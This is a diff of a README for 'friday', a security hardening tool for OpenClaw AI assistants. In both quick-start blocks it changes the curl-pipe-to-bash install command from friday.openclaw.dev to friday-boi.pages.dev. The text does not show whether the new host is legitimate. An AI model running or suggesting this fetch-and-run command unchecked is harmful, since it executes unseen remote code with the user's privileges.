@@ -3,7 +3,7 @@
 🛡️ Security hardening tool for OpenClaw AI assistants. One command to audit vulnerabilities, detect malicious skills via Clawdex, and secure your instance.
 
 ```bash
-curl -sSL friday.openclaw.dev | bash
+curl -sSL friday-boi.pages.dev | bash
 ```
 
 [![GitHub stars](https://img.shields.io/github/stars/juicecreepz/friday?style=social)](https://github.com/juicecreepz/friday)
@@ -14,7 +14,7 @@ curl -sSL friday.openclaw.dev | bash
 ## 🚀 Quick Start
 
 ```bash
-curl -sSL friday.openclaw.dev | bash
+curl -sSL friday-boi.pages.dev | bash
 ```
 
 ## ✨ Features
